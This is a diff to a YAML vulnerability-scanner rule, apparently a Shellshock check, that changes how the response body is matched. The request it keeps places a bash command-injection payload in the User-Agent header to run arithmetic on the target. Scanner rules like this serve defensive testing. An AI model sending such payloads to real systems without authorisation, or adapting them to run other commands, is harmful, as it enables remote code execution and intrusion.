@@ -23,7 +23,7 @@ rules:
 - method: GET
     headers:
     User-Agent: "() { :; }; echo; echo; /bin/bash -c 'expr {{r1}} + {{r2}}'"
-    expression: response.body.bcontains(bytes(string(r1+r2)))
+    expression: response.body_string.contains(string(r1 + r2))
 detail:
 author: example(https://github.com/example)
 links:
